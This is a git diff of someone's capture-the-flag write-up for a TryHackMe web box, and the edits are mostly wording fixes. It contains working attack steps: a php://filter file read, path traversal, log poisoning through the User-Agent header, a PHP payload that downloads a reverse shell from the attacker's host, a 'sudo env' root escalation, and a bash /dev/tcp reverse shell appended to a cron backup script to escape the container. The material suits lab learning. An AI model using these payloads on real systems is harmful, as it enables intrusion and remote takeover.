@@ -2,7 +2,7 @@
 
 Notes from challenges I did @ <https://tryhackme.com>.
 
-Flags are not fully written to avoid  copy & paste ;)
+Flags are not fully written to avoid copy & paste ;)
 
 Connect to current challenge: ```sudo openvpn 0xfab1.ovpn```
 
@@ -31,7 +31,7 @@ Running nmap to search for available services and versions:
 nmap -sC -sV 10.10.46.238
 ```
 
-Result: two port open SSH on 22 and HTTP on 80
+Result: two ports open SSH on 22 and HTTP on 80
 
 ```txt
 Host is up (0.021s latency).
@@ -100,7 +100,7 @@ Warning: include(somethingwithdog.php): failed to open stream: No such file or d
 Warning: include(): Failed opening 'somethingwithdog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
 ```
 
-So we know the page requires us to add dog (or cat) in the url/request and then adds ".php" to whatever we give the view.
+So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php".
 
 We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D
 
@@ -109,22 +109,6 @@ We know the website is served using apache 2.4.38 (from opening /server-status a
 ```
 
 This fails with the same error as above. So it seems we can only view ".php" files...
-
-If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:
-
-```html
-?view=php://filter/convert.base64-encode/resource=./cat/../flag
-```
-
-We get the message: ```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d...```
-
-Which we can decode as follows to get the first flag:
-
-```sh
-echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=" | base64 --decode
-```
-
-However, this was a lucky guess... maybe there is another way to get there...
 
 #### Log Poisoning
 
@@ -177,7 +161,7 @@ The index.php looks as follows:
 </html>
 ```
 
-The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```. We see that if we add ```?ext``` we are no longer limited to requesting php files. We can either add e.g. ```&ext=.txt``` or ```&ext=.log``` to view a text or log file.
+The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```. We see that if we add the parameter ```?ext``` we are no longer limited to requesting php files. We can add e.g. ```&ext=.txt``` or ```&ext=.log``` to view a text or log file or simply keep the parameter empty to view any file ```&ext=```.
 
 Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):
 
@@ -186,6 +170,22 @@ Now lets try looking at the apache2 access.log files again (this time with the "
 ```
 
 Sucecss! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.
+
+If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:
+
+```html
+?view=php://filter/convert.base64-encode/resource=./cat/../flag
+```
+
+We get the message: ```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d...```
+
+Which we can decode as follows to get the first flag:
+
+```sh
+echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=" | base64 --decode
+```
+
+However, this was a lucky guess... maybe there is another way to get there...
 
 We can try to inject PHP code to the access.log and trigger the code by visiting the page. Let's try running a request e.g.:
 
@@ -199,7 +199,7 @@ Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are 
 curl -A "<?php echo "HI!";?>" http://10.10.209.48
 ```
 
-Success! The user-agent string can be used to inject PHP code. Let's use this to trigger a php reverse shell.
+Success! The user-agent string can be used to inject PHP code. Let's use this to download a php reverse shell.
 
 ### Reverse shell
 
@@ -218,7 +218,7 @@ Serve the file e.g. with python as follows:
 python -m http.server 9090
 ```
 
-And start netcat on port 9999 in a secound shell:
+And start netcat on port 9999 in a second shell:
 
 ```sh
 nc -lvnp 9999
@@ -237,19 +237,24 @@ import requests
 print (requests.get('http://10.9.182.239/?view=cat', headers={'User-Agent': '<?php file_put_contents("shell.php",file_get_contents("http://10.9.182.239:9090/shell.php")); ?>',}).text)
 ```
 
-Have a look at the access log using the webbrowser. You should not see this entry but you can see if this worked by checking the status of the python SimpleHTTPServer.
-
-We can now visit the shell.php located in the the main web folder:
+Use the previous technique to include the access log again:
 
 ```html
-http://localhost:8080/?view=./cat/../shell
+?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
+```
+You should not see our injected agent string because the injected php code is interpreted and executed and has no output. But you can see if this worked by checking the status of the python HTTP server.
+
+We can now start the shell.php located in the the main web folder:
+
+```html
+?view=./cat/../shell
 ```
 
-On the netcat terminal we should now a command prompt :)
-Running ```whoami``` we see we are user "www-data" and searching for flag2 reveals the following file:
+On the netcat terminal we should now have a command prompt :)
+Running ```whoami``` we see we are user "www-data". Searching for flag2 reveals the following file:
 
 ```sh
-find / -type f -iname "*flag*",
+find / -type f -iname "*flag*"
 var/www/html/flag.php
 var/www/flag2_QMW7JvaY2LvK.txt
 ```
@@ -257,12 +262,12 @@ var/www/flag2_QMW7JvaY2LvK.txt
 Btw, it is possible to view flag2 within the browser and without reverse shell:
 
 ```html
-view-source:http://localhost:8080/?view=./dog/../../../../../var/www/flag2_QMW7JvaY2LvK&ext=.txt
+?view=./dog/../../../../../var/www/flag2_QMW7JvaY2LvK&ext=.txt
 ```
 
 ### Privilege escalation
 
-Now that we have a shall as user "www-data" let's see what this user is allowed to do:
+Now that we have a shell as user "www-data" let's see what this user is allowed to do:
 
 ```sh
 sudo -l
@@ -274,7 +279,9 @@ We can [exploit the env privilege](https://gtfobins.github.io/) with this comman
 sudo /usr/bin/env sudo -i
 ```
 
-Now, as root, let us again look for a flag:
+Running ```whoami``` we can see that we are root.
+
+Now, let's again look for a flag:
 
 ```sh
 find / -type f -iname "*flag*"
@@ -283,7 +290,7 @@ find / -type f -iname "*flag*"
 
 ### Escape the container
 
-The last challenge is to find flag 4 which is no where to be found on the current system. We need to search for interesting things on the system...
+The last challenge is to find flag 4 which is nowhere to be found on the current system. We need to search for interesting things on the system...
 
 List IP addresses connected to your server on port 80
 
@@ -315,26 +322,28 @@ or search for newest files
 find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print
 ```
 
-We find that "backup.tar" was last udpated and it seems is updated every minute!
+We find that "backup.tar" was last udpated and it is updated every minute!
 It seems as if the backup is created using the shell script in the same folder.
 
-This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script every minute.
+This looks promising: We are root in a container that hosts the dogcat website and there is a script triggered from outside of the container running the "backup.sh" script (that we are able to edit) every minute.
 
 Let's try to exploit the backup.sh with a bash reverse shell:
 
-First, start a new netcat session as root within the webserver container:
+First, start a new netcat session on your system:
 
 ```sh
 nc -lvnp 9999
 ```
 
-Then overwrite the backup script with this bash reverse shell:
+Then append the bash reverse shell to the backup script:
 
 ```sh
 echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
 ```
 
-After waiting at the most 59 secounds the backup job will trigger, run our modified script and we get root access to the container host :) whoop whoop!
+After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system. 
+
+Running ```whoami``` we can see that we are root - whoop whoop!
 
 Let's search for flag 4:
 
